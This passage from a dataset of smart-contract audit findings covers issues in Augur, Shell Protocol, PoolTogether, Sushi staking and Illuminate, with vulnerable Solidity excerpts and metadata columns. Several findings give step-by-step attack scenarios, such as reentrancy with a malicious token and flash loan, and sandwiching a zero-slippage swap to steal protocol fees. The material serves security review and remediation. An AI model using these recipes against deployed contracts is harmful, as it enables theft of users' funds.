* 3.2) In [line 237](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L237), the attacker-controlled `universe` returns the necessary value to make `true` the conditional clause, bypassing (*i.e.* never executing) all logic in the [`else`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L240) [`clause`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L240).
* 3.3) The attacker-controlled `universe` sets `winningPayoutDistributionHash` to some value other than zero in [line 239](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L239). From now on, every call to `Market`‚Äòs [`isFinalized`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L468) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L468) will return `true`.
* 3.4) In [line 250](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L250), the execution flow goes into the [`distributeValidityBondAndMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L308) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L308), where in line 310 the [`marketCreatorFeesAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L310) [is set to](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L310) [`validityBondAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L310), which in turn is all `Market`‚Äòs CASH balance (see 1.5).
* 3.5) Inside the [`distributeMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L314) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L314), the [call to](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L315) [`isInvalid`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L315) [in line 315](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L315) will return `true` (see 3.3 and 2.4), therefore the execution flow will jump straight to [line 321](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L321), where the `Market` contract will finally send `marketCreatorFeesAttoCash` amount of tokens (the entire CASH balance ‚Äì see 3.4 and 1.5) to an attacker-controlled address (as the attacker controls `universe.getOrCreateNextDisputeWindow(false)`).


As explained, by combining the vulnerability reported in the issue **‚Äú[C01] All CASH tokens approved to Augur can be emptied‚Äù** with the correct execution of the steps above, any malicious user can effectively steal CASH tokens that are approved to the Augur contract. While initially the attack here described seems to be prevented by properly verifying the legitimacy of the `universe` address set in the `Market` contract, a thorough review of the entire attack vector, which includes complex interactions between the [`Augur`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol), [`MarketFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol), [`Market`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol) and [`InitialReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol) contracts, is in order, so as to determine the most appropriate course of action to mitigate the critical vulnerability.


***Update****: the Augur team correctly pointed out that this attack is not actually possible because the transaction will be reverted upon calling the `logInitialReportSubmitted`* *function in the* *`Augur`* *contract (which checks that the passed universe address is legitimate).*",Augur Core v2¬†Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/augur-core-v2-audit/,,,solodit_reports,,2023-09-22 02:37:14,2024-10-14 21:17:46,1,"function initialize(IAugur _augur, IUniverse _universe, uint256 _endTime, uint256 _feePerCashInAttoCash, uint256 _affiliateFeeDivisor, address _designatedReporterAddress, address _creator, uint256 _numOutcomes, uint256 _numTicks) public beforeInitialized returns (bool _success) {
```
        owner = _creator;
```
        repBondOwner = owner;
```
        universe = _universe;
```
        participants.push(_initialReporterFactory.createInitialReporter(augur, this, _designatedReporterAddress));
```
        designatedReporter = _designatedReporter;
```
        repBond = universe.getOrCacheMarketRepBond();
```
        validityBondAttoCash = cash.balanceOf(address(this));
```
        endTime = _endTime;
```
            require(_reputationToken.transfer(repBondOwner, _initialReportStake));
            _reputationToken.trustedMarketTransfer(_reporter, address(_initialReporter), _initialReportStake);
```
            require(_reputationToken.transfer(address(_initialReporter), _initialReportStake));
```
        disputeWindow = universe.getOrCreateNextDisputeWindow(true);
```
        _initialReporter.report(_reporter, _payoutDistributionHash, _payoutNumerators, _initialReportStake);
```
        actualReporter = _reporter;
        owner = _reporter;
```
        payoutNumerators = _payoutNumerators;
```
    function getPayoutNumerator(uint256 _outcome) public view returns (uint256) {
```
        size = _initialReportStake;
```
    function finalize() public returns (bool) {
```
        require(winningPayoutDistributionHash == bytes32(0));
```
        if (universe.getForkingMarket() == this) {
```
        } else {
```
            winningPayoutDistributionHash = _winningUniverse.getParentPayoutDistributionHash();
```
    function isFinalized() public view returns (bool) {
```
        distributeValidityBondAndMarketCreatorFees();
```
    function distributeValidityBondAndMarketCreatorFees() private returns (bool) {
```
        marketCreatorFeesAttoCash = validityBondAttoCash.add(marketCreatorFeesAttoCash);
```
    function distributeMarketCreatorFees(address _affiliateAddress) private returns (bool) {
```
        if (!isInvalid()) {
```
            cash.transfer(address(universe.getOrCreateNextDisputeWindow(false)), marketCreatorFeesAttoCash);",Dexes|CDP|Services|Prediction Market|Oracle
760156,cacecf084ce612c88e6436da76638ae3,Certain functions lack input validation routines ‚úì¬†Fixed,ConsenSys,2020-06-01,"#### Resolution



*Comment from the development team*:


1. Now all functions in the Orchestrator revert on incorrect arguments.
2. All functions in Loihi in general revert on incorrect arguments.




#### Description


The functions should first check if the passed arguments are valid first. The [checks-effects-interactions](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern should be implemented throughout the code.


These checks should include, but not be limited to:


* `uint` should be larger than `0` when `0` is considered invalid
* `uint` should be within constraints
* `int` should be positive in some cases
* length of arrays should match if more arrays are sent as arguments
* addresses should not be `0x0`


#### Examples


The function `includeAsset` does not do any checks before changing the contract state.


**src/Loihi.sol:L59-L61**



```
function includeAsset (address \_numeraire, address \_nAssim, address \_reserve, address \_rAssim, uint256 \_weight) public onlyOwner {
    shell.includeAsset(\_numeraire, \_nAssim, \_reserve, \_rAssim, \_weight);
}

```
The internal function called by the public method `includeAsset` again doesn‚Äôt check any of the data.


**src/Controller.sol:L77-L97**



```
function includeAsset (Shells.Shell storage shell, address \_numeraire, address \_numeraireAssim, address \_reserve, address \_reserveAssim, uint256 \_weight) internal {

    Assimilators.Assimilator storage \_numeraireAssimilator = shell.assimilators[\_numeraire];

    \_numeraireAssimilator.addr = \_numeraireAssim;

    \_numeraireAssimilator.ix = uint8(shell.numeraires.length);

    shell.numeraires.push(\_numeraireAssimilator);

    Assimilators.Assimilator storage \_reserveAssimilator = shell.assimilators[\_reserve];

    \_reserveAssimilator.addr = \_reserveAssim;

    \_reserveAssimilator.ix = uint8(shell.reserves.length);

    shell.reserves.push(\_reserveAssimilator);

    shell.weights.push(\_weight.divu(1e18).add(uint256(1).divu(1e18)));

}

```
Similar with `includeAssimilator`.


**src/Loihi.sol:L63-L65**



```
function includeAssimilator (address \_numeraire, address \_derivative, address \_assimilator) public onlyOwner {
    shell.includeAssimilator(\_numeraire, \_derivative, \_assimilator);
}

```
Again no checks are done in any function.


**src/Controller.sol:L99-L106**



```
function includeAssimilator (Shells.Shell storage shell, address \_numeraire, address \_derivative, address \_assimilator) internal {

    Assimilators.Assimilator storage \_numeraireAssim = shell.assimilators[\_numeraire];

    shell.assimilators[\_derivative] = Assimilators.Assimilator(\_assimilator, \_numeraireAssim.ix);
    // shell.assimilators[\_derivative] = Assimilators.Assimilator(\_assimilator, \_numeraireAssim.ix, 0, 0);

}

```
Not only does the administrator functions not have any checks, but also user facing functions do not check the arguments.


For example `swapByOrigin` does not check any of the arguments if you consider it calls `MainnetDaiToDaiAssimilator`.


**src/Loihi.sol:L85-L89**



```
function swapByOrigin (address \_o, address \_t, uint256 \_oAmt, uint256 \_mTAmt, uint256 \_dline) public notFrozen returns (uint256 tAmt\_) {

    return transferByOrigin(\_o, \_t, \_dline, \_mTAmt, \_oAmt, msg.sender);

}

```
It calls `transferByOrigin` and we simplify this example and consider we have `_o.ix == _t.ix`


**src/Loihi.sol:L181-L187**



```
function transferByOrigin (address \_origin, address \_target, uint256 \_dline, uint256 \_mTAmt, uint256 \_oAmt, address \_rcpnt) public notFrozen nonReentrant returns (uint256 tAmt\_) {

    Assimilators.Assimilator memory \_o = shell.assimilators[\_origin];
    Assimilators.Assimilator memory \_t = shell.assimilators[\_target];

    // TODO: how to include min target amount
    if (\_o.ix == \_t.ix) return \_t.addr.outputNumeraire(\_rcpnt, \_o.addr.intakeRaw(\_oAmt));

```
In which case it can call 2 functions on an assimilatior such as `MainnetDaiToDaiAssimilator`.


The first called function is `intakeRaw`.


**src/assimilators/mainnet/daiReserves/mainnetDaiToDaiAssimilator.sol:L42-L49**



```
// transfers raw amonut of dai in, wraps it in cDai, returns numeraire amount
function intakeRaw (uint256 \_amount) public returns (int128 amount\_, int128 balance\_) {

    dai.transferFrom(msg.sender, address(this), \_amount);

    amount\_ = \_amount.divu(1e18);

}

```
And its result is used in `outputNumeraire` that again does not have any checks.


**src/assimilators/mainnet/daiReserves/mainnetDaiToDaiAssimilator.sol:L83-L92**



```
// takes numeraire amount of dai, unwraps corresponding amount of cDai, transfers that out, returns numeraire amount
function outputNumeraire (address \_dst, int128 \_amount) public returns (uint256 amount\_) {

    amount\_ = \_amount.mulu(1e18);

    dai.transfer(\_dst, amount\_);

    return amount\_;

}

```
#### Recommendation


Implement the `checks-effects-interactions` as a pattern to write code. Add tests that check if all of the arguments have been validated.


Consider checking arguments as an important part of writing code and developing the system.",Shell Protocol,Gon√ßalo S√°|Daniel Luca,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2020/06/shell-protocol/,,,solodit_reports,,2023-09-22 02:37:24,2024-10-14 21:20:19,1,,Liquid Staking|Bridge|CDP|Yield|Cross Chain
762278,e18c9c33739376c375bb58e9dcaf8d0f,[H-01] `createPromotion()` Lack of input validation for `_epochDuration` can potentially freeze promotion creator's funds,Code4rena,2021-12-09,"_Submitted by WatchPug_

<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L88-L116>

```solidity
function createPromotion(
    address _ticket,
    IERC20 _token,
    uint216 _tokensPerEpoch,
    uint32 _startTimestamp,
    uint32 _epochDuration,
    uint8 _numberOfEpochs
) external override returns (uint256) {
    _requireTicket(_ticket);

    uint256 _nextPromotionId = _latestPromotionId + 1;
    _latestPromotionId = _nextPromotionId;

    _promotions[_nextPromotionId] = Promotion(
        msg.sender,
        _ticket,
        _token,
        _tokensPerEpoch,
        _startTimestamp,
        _epochDuration,
        _numberOfEpochs
    );

    _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);

    emit PromotionCreated(_nextPromotionId);

    return _nextPromotionId;
}
```

In the current implementation of `createPromotion()`, `_epochDuration` is allowed to be `0`.

However, when `_epochDuration = 0`, it will be impossible for users to claim the rewards, and the promotion creator won't be able to cancel it.

#### Proof of Concept

1.  Alice called `createPromotion()` to create a promotion with the following parameters:
    *   \_token: `USDC`
    *   \_tokensPerEpoch: `10,000`
    *   \_epochDuration: `0`
    *   \_numberOfEpochs: `10`
2.  `100,000 USDC` was transferred from Alice to the `TwabRewards` contract;
3.  Users tries to `claimRewards()` but the transaction always revert at `_ticket.getAverageTotalSuppliesBetween()` -> `TwabLib.getAverageBalanceBetween()` due to div by 0.
4.  Alice tries to `cancelPromotion()` to retrieve the funds, but it always reverts at `_requirePromotionActive()` since the promotion already ended.

As a result, Alice's `100,000 USDC` is frozen in the contract.

#### Recommendation

Consider adding `require(_epochDuration > 0)` in `createPromotion()`.

**[PierrickGT (PoolTogether) marked as duplicate](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106#issuecomment-993713041):**
 > Duplicate of https://github.com/code-423n4/2021-12-pooltogether-findings/issues/29

**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106#issuecomment-1008322347):**
 > I do not consider this to be a duplicate of #29 because the warden in #29 does not mention this specific failure case. This is indeed an easy to encounter bug that can be triggered as the result of a user error or a frontend bug. Loss of all funds for the promotion would be the result.

 **PierrickGT (PoolTogether) confirmed and resolved:**
 > Implemented the suggested require: https://github.com/pooltogether/v4-periphery/blob/e0010b689fb170daac77af5f62abba7ca1397524/contracts/TwabRewards.sol#L126",PoolTogether,,HIGH,,"$25,000 USDC",0,0,0,https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106,https://code4rena.com/reports/2021-12-pooltogether,,https://code4rena.com/reports/2021-12-pooltogether,solodit_reports,f915e44c4b16705d8cad9a0daeb15798,2023-09-22 02:39:29,2024-10-14 22:02:31,1,"function createPromotion(
        address _ticket,
        IERC20 _token,
        uint216 _tokensPerEpoch,
        uint32 _startTimestamp,
        uint32 _epochDuration,
        uint8 _numberOfEpochs
    ) external override returns (uint256) {
        _requireTicket(_ticket);

        uint256 _nextPromotionId = _latestPromotionId + 1;
        _latestPromotionId = _nextPromotionId;

        _promotions[_nextPromotionId] = Promotion(
            msg.sender,
            _ticket,
            _token,
            _tokensPerEpoch,
            _startTimestamp,
            _epochDuration,
            _numberOfEpochs
        );

        _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);

        emit PromotionCreated(_nextPromotionId);

        return _nextPromotionId;
    }",Liquid Staking|Dexes|Bridge|CDP|Yield
763624,1e168a7afbc78486cf7126015cdb2e7f,Missing Input Validation Allows Subscribing to Non-Existent Incentives,SigmaPrime,2022-05-01,"Description
Missing input validation checks allows an attacker to steal substantially more rewards than available in a given incentive.
The attack occurs due to a bug which allows subscribing to incentives which do not yet exist. Furthermore it is possible
to subscribe to an incentive multiple times if it does not yet exist. subscribeToIncentive does not check if the user-
supplied incentiveId is actually valid.
The bug is exploited by subscribing to a nonexistent incentive multiple times as seen in the following scenario:
1. The attacker subscribes 6 times to a nonexistent, but upcoming, incentive number. This is done using a fake
zero-address subscription.
2. A genuine user creates a new incentive with X rewards in USDC. The incentive number matches the previously
nonexistent one our attacker subscribed to.
3. As other users create similar USDC based rewards, the contract begins to hold a lot of USDC.
4. The attacker fakes their zero-address subscriptions for 6 real ones by unsubscribing and re-subscribing. He pro-
ceeds to stake some amount.
5. After some time has passed, The attacker unstakes some strategic amount, choosing save rewards. This will set
their rewardPerLiquidityLast erroneously low.
6. The attacker calls claimRewards() for the victim‚Äôs incentiveId . They have the ability to drain more rewards
than those provided by the incentive creator, draining funds from other users.
Note that it is also possible to subscribe to the incentive with ID zero, which is never used.
Recommendations
This issue may be mitigated by preventing the subscription to incentives which have not yet been created. This can be
done by adding a check that forbids subscribing to an incentive which has a creator value of the zero-address.
Alternatively this issue may be mitigated by ensuring 0 < incentiveId && incentiveId <= incentiveCount .
Resolution
This issue was rectified by rejecting subscriptions to non existent proposals as seen in the following
Page | 8
BentoBox Strategies and Staking Contract Detailed Findings
if ( incentiveId >incentiveCount ||incentiveId <= 0) revert InvalidInput ();
The fix is outlined in PR 1
Page | 9
BentoBox Strategies and Staking Contract Detailed Findings
SSBS-03 startTime Incentive Restrictions Can be Bypassed",Sushi,Sigma Prime,HIGH,,,9,0,0,,https://github.com/sigp/public-audits/blob/master/sushi/bentobox-strategies-staking-contract/review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/sigmaprime/bentobox-strategies-staking-contract.pdf,https://github.com/sigp/public-audits/blob/master/sushi/bentobox-strategies-staking-contract/review.pdf,solodit_reports,038b38982e25ff22d0c7d3b3e44c3aba,2023-09-22 02:40:45,2024-10-14 22:25:02,1,,Dexes|CDP|Yield|Services|Yield Aggregator
763625,25348ac46a15493ee283e08b912e3e96,Reentrancy Vulnerability Allows Draining All Funds,SigmaPrime,2022-05-01,"Description
A reentrancy vulnerabilitiy in the function stakeToken() allows an attacker to drain the funds of any ERC20 token
deposited in the contract.
InstakeToken() on line [ 180],msg.sender ‚Äôs liquidity is updated in the state variable userStakes , however the incen-
tive‚Äôs total liquidity is not updated until line [ 202]. In between, on line [ 194], there is a call to _claimReward() which
passes execution flow back to the token being transferred. Using a malicious token that can react to transfers, such
as an ERC777 token, or a custom attack token, the attacker can reenter the contract in between these two lines and
interact with the contract in a partially updated state.
In the partially updated state, userStake.liquidity has been increased but the total liquidity of one or more incentives
have not been. userStake.liquidity is global across all the user‚Äôs incentives, and is used as a multiplier when rewards
are calculated. Therefore, a malicious user may multiply the rewards for unclaimed incentives by an inflated figure, and
drain tokens.
The steps taken for this attack are as follows, suppose that there are multiple incentives where USDC is the staking
token. Bob is the attacker and has created a malicious token contract, ATT.
1. Bob creates an incentive staking USDC for rewards in ATT.
2. Bob deposits some USDC into multiple target incentives and also into his ATT incentive. All target incentives must
be staking USDC for some other token. It is these other tokens that will be drained. The order of subscriptions is
also important. The ATT incentive needs to be first.
3. Bob waits for some rewards to accumulate.
4. Bob takes a flash loan of USDC and calls stakeToken() to deposit the flash loan with the parameter
transferExistingRewards asTrue . As the staking contract loops through the incentives that Bob is subscribed
to on line [ 184], it calls the ATT incentive first (as Bob has been careful to subscribe in the correct order for this
to happen).
5. When ATT‚Äôs safeTransfer() function is called, it passes execution control to Bob, allowing reentrancy. Bob calls
claimRewards() for the other incentives he is subscribed to. The reward multiplier usersLiquidity on line [ 378]
will be out of proportion to the overall liquidity and this can result in the staking contract paying out its entire
balance of the reward token.
6. Bob calls unstakeToken() to get back the flash loan and repays it.
A similar reentrancy vulnerability occurs using _claimReward() which instead reenters the function
unsubscribeFromIncentive() and may overflow the unchecked operation on the following line.
Ôú≤Ôú∏Ôú∂ unchecked {incentive .liquidityStaked -=userStake .liquidity ; }
Page | 6
BentoBox Strategies and Staking Contract Detailed Findings
Recommendations
There are two preventive measures that may be taken to mitigate reentrancy:
1. Carefully implement the checks->effects->interactions pattern throughout StakingContractMainnet . In particular,
make sure that it is not being violated within function calls. This ensures that all external calls are made after state
updates.
2. Use a reentrancy guard, the best known of which is OpenZeppelin‚Äôs ReentrancyGuard , and apply its modifier
nonReentrant() on all public and external functions.
This reentrancy protection will also prevent against the unchecked overflow on line [ 286]. In that case, consider also
removing the unchecked wrapper to allow for overflow protection in the two functions unsubscribeFromIncentive()
and unstakeToken() . The gas increase of using checked math is small for these two variables and the added security
significant.
Resolution
This issue was resolved by using the Solmate re-entrancy guard
The fix is outlined in PR 1
Page | 7
BentoBox Strategies and Staking Contract Detailed Findings
SSBS-02 Missing Input Validation Allows Subscribing to Non-Existent Incentives",Sushi,Sigma Prime,HIGH,Reentrancy,,7,0,0,,https://github.com/sigp/public-audits/blob/master/sushi/bentobox-strategies-staking-contract/review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/sigmaprime/bentobox-strategies-staking-contract.pdf,https://github.com/sigp/public-audits/blob/master/sushi/bentobox-strategies-staking-contract/review.pdf,solodit_reports,038b38982e25ff22d0c7d3b3e44c3aba,2023-09-22 02:40:45,2024-10-14 22:25:02,1,,Dexes|CDP|Yield|Services|Yield Aggregator
765825,3aeecdba6d372e8a41f300cfd063541a,H-16: User-supplied AMM pools and no input validation allows stealing of stEth protocol fees,Sherlock,2022-11-07,"# Issue H-16: User-supplied AMM pools and no input validation allows stealing of stEth protocol fees 

Source: https://github.com/sherlock-audit/2022-10-illuminate-judging/issues/47 

## Found by 
IllIllI, 0x52, kenzo

## Summary
Some of the protocols `lend` methods take as user input the *underlying asset* and the *pool to swap on.*
They do not check that they match.
**Therefore a user can supply to `Lender` DAI underlying,
instruct `Lender` to swap stEth with 0 `minAmountOut`,
and sandwich the transaction to 0, thereby stealing all of Lender's stEth fees.**

## Vulnerability Detail
In Tempus, APWine, Sense, Illuminate and Swivel's `lend` methods,
the underlying, the pool to swap on, and the minAmountOut, are all user inputs.
**There is no check that they match**,
and the external swap parameters do not contain the actual asset to swap - only the pool to swap in. Which is a user input.
So an attacker can do the following, for example with APWine:
- Let's say `Lender` has accumulated 100 stEth in fees.
- The attacker will call APWine's `lend`, with `underlying = DAI`, `amount = 100 eth`, `minimumAmountOfTokensToBuy = 0`, and AMM pool (`x`) that is actually for stEth (*tam tam tam!*).
- `lend` will pull 100 DAI from the attacker.
- `lend` will call APWine's router with the *stEth pool*, and 0 `minAmountOut`. (I show this in code snippet section below).
- The attacker will sandwich this whole `lend` call such that `Lender` will receive nearly 0 tokens. This is possible since the user-supplied `minAmountOut` is 0.
- `lend` will execute this swapping operation. It will receive nearly 0 APWine-stEth-PTs.
- Since the attacker sandwiched this transaction to 0, he will gain all the stEth that Lender tried to swap - all the stEth fees of the protocol.

## Impact
Theft of stEth fees, as detailed above.

## Code Snippet
Here is APWine's `lend` [method](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L572).
You can notice the following things. Specifically note the `swapExactAmountIn` operation.
- There is no check that user-supplied `pool` swaps token `u`
- `apwinePairPath()` and `apwineTokenPath()` do not contain actual asset addresses, but only relative `0` or `1`
- Therefore, `pool` can be totally unrelated to `u`
- The user supplies the slippage limit - `r` - so he can use `0`
- The swap will be executed for the same amount (minus fees) that has been pulled from the user; but user can supply DAI and swap for same amount of stEth, a Very Profitable Trading Strategy
- We call the real APWine router so `Lender` has already approved it

Because of these, the attack described above will succeed - the user can supply DAI as underlying, but actually make Lender swap stEth with 0 minAmountOut.
```solidity
    /// @notice lend method signature for APWine
    /// @param p principal value according to the MarketPlace's Principals Enum
    /// @param u address of an underlying asset
    /// @param m maturity (timestamp) of the market
    /// @param a amount of underlying tokens to lend
    /// @param r slippage limit, minimum amount to PTs to buy
    /// @param d deadline is a timestamp by which the swap must be executed
    /// @param x APWine router that executes the swap
    /// @param pool the AMM pool used by APWine to execute the swap
    /// @return uint256 the amount of principal tokens lent out
    function lend( uint8 p, address u, uint256 m, uint256 a, uint256 r, uint256 d, address x, address pool) external unpaused(u, m, p) returns (uint256) {
        address principal = IMarketPlace(marketPlace).token(u, m, p);

        // Transfer funds from user to Illuminate
        Safe.transferFrom(IERC20(u), msg.sender, address(this), a);

        uint256 lent;
        {
            // Add the accumulated fees to the total
            uint256 fee = a / feenominator;
            fees[u] = fees[u] + fee;

            // Calculate amount to be lent out
            lent = a - fee;
        }

        // Get the starting APWine token balance
        uint256 starting = IERC20(principal).balanceOf(address(this));

        // Swap on the APWine Pool using the provided market and params
        IAPWineRouter(x).swapExactAmountIn(
            pool,
            apwinePairPath(),
            apwineTokenPath(),
            lent,
            r,
            address(this),
            d,
            address(0)
        );

        // Calculate the amount of APWine principal tokens received after the swap
        uint256 received = IERC20(principal).balanceOf(address(this)) -
            starting;

        // Mint Illuminate zero coupons
        IERC5095(principalToken(u, m)).authMint(msg.sender, received);

        emit Lend(p, u, m, received, a, msg.sender);
        return received;
    }

    function apwineTokenPath() internal pure returns (uint256[] memory) {
        uint256[] memory tokenPath = new uint256[](2);
        tokenPath[0] = 1;
        tokenPath[1] = 0;
        return tokenPath;
    }

    /// @notice returns array pair path required for APWine's swap method
    /// @return array of uint256[] as laid out in APWine's docs
    function apwinePairPath() internal pure returns (uint256[] memory) {
        uint256[] memory pairPath = new uint256[](1);
        pairPath[0] = 0;
        return pairPath;
    }
```
The situation is similar in:
- [`Tempus`](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L632), where `x` is the pool to swap on.
- [`Sense`](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L725), where `adapter` is user-supplied.
- [`Illuminate`](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L323), where if the principal is Yield, the function [is checking](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L326) that the underlying token matches the pool. But the user can supply the principal to be Illuminate, bypassing this check, and supplying the YieldPool `y` to be one that swaps stEth for fyEth.
- [`Swivel`](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Lender.sol#L415), where I believe that the user can supply an order to swap stEth instead of DAI.

## Tool used
Manual Review

## Recommendation
Check that the user-supplied pool/adapter/order's tokens match the underlying. This should ensure that the user only swaps assets he supplied.

## Discussion

**0x00052**

Escalate for 25 USDC

This can be used to steal protocol fees, see my issue #161 (duplicate). Loss of funds with no external factors should be high not medium. Historically this has included protocol fees being stolen (see Mover H-1)

**sherlock-admin**

 > Escalate for 25 USDC
> 
> This can be used to steal protocol fees, see my issue #161 (duplicate). Loss of funds with no external factors should be high not medium. Historically this has included protocol fees being stolen (see Mover H-1)

You've created a valid escalation for 25 USDC!

To remove the escalation from consideration: Delete your comment.
To change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**Evert0x**

Escalation accepted

**sherlock-admin**

> Escalation accepted

This issue's escalations have been accepted!

Contestants' payouts and scores will be updated according to the changes made on this issue.",Illuminate,0x52|kenzo|IllIllI,HIGH,Validation,50000 USDC,0,3,3,https://github.com/sherlock-audit/2022-10-illuminate-judging/issues/47,,,https://app.sherlock.xyz/audits/contests/12,solodit_reports,,2023-09-22 02:42:54,2024-10-14 23:09:43,1,"function lend(
```
    function lend(
```
            ISensePeriphery(x).swapUnderlyingForPTs(adapter, s, lent, r);
```
        if (p == uint8(MarketPlace.Principals.Yield)) {
```
            if (IYield(y).fyToken() != principal) {
```
                ISwivel(swivelAddr).initiate(o, a, s);",Dexes|CDP|Yield|Yield Aggregator|Cross Chain
765827,d894711542a4ea448c70a1a5b0615250,H-4: User can accidentally burn their iPT tokens during redemption,Sherlock,2022-11-07,"# Issue H-4: User can accidentally burn their iPT tokens during redemption 

Source: https://github.com/sherlock-audit/2022-10-illuminate-judging/issues/222 

## Found by 
Jeiwan

## Summary
User can accidentally burn their iPT tokens during redemption
## Vulnerability Detail
The `redeem` function that redeems iPT tokens burns iPT tokens even when the `holdings` mapping is empty and the redeemed amount is 0 ([Redeemer.sol#L403-L434](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Redeemer.sol#L403-L434)).
## Impact
A user can accidentally call the `redeem` function after maturity but before the other `redeem` function is called (the one that burns external PT tokens‚Äìthey have identical names). User's iPT tokens will be burned and no underlying tokens will be sent in exchange.
## Code Snippet
[Redeemer.sol#L403](https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Redeemer.sol#L403):
```solidity
function redeem(address u, uint256 m) external unpaused(u, m) {
    // Get Illuminate's principal token for this market
    IERC5095 token = IERC5095(
        IMarketPlace(marketPlace).token(
            u,
            m,
            uint8(MarketPlace.Principals.Illuminate)
        )
    );

    // Verify the token has matured
    if (block.timestamp < token.maturity()) {
        revert Exception(7, block.timestamp, m, address(0), address(0));
    }

    // Get the amount of tokens to be redeemed from the sender
    uint256 amount = token.balanceOf(msg.sender);

    // Calculate how many tokens the user should receive
    uint256 redeemed = (amount * holdings[u][m]) / token.totalSupply();

    // Update holdings of underlying
    holdings[u][m] = holdings[u][m] - redeemed;

    // Burn the user's principal tokens
    // @audit burns iPT tokens even if  the holdings mapping is empty
    token.authBurn(msg.sender, amount);

    // Transfer the original underlying token back to the user
    Safe.transfer(IERC20(u), msg.sender, redeemed);

    emit Redeem(0, u, m, redeemed, msg.sender);
}
```
## Tool used
Manual Review
## Recommendation
Consider disallowing calling the second `redeem` function (the one that redeems iPT tokens) before the first `redeem` function (the one that redeems external PT tokens) is called.



## Discussion

**sourabhmarathe**

Input validation is not within the scope of the audit. We expect to use other resources to ensure that users are executing the redemptions properly outside of the smart contract.

**JTraversa**

Duplicate of #239 

**Evert0x**

Not a duplicate of #239 but of #81",Illuminate,Jeiwan,HIGH,,50000 USDC,0,0,0,https://github.com/sherlock-audit/2022-10-illuminate-judging/issues/222,,,https://app.sherlock.xyz/audits/contests/12,solodit_reports,,2023-09-22 02:42:54,2024-10-14 23:09:11,1,"function redeem(address u, uint256 m) external unpaused(u, m) {
        // Get Illuminate's principal token for this market
        IERC5095 token = IERC5095(
            IMarketPlace(marketPlace).token(
                u,
                m,
                uint8(MarketPlace.Principals.Illuminate)
            )
        );

        // Verify the token has matured
        if (block.timestamp < token.maturity()) {
            revert Exception(7, block.timestamp, m, address(0), address(0));
        }

        // Get the amount of tokens to be redeemed from the sender
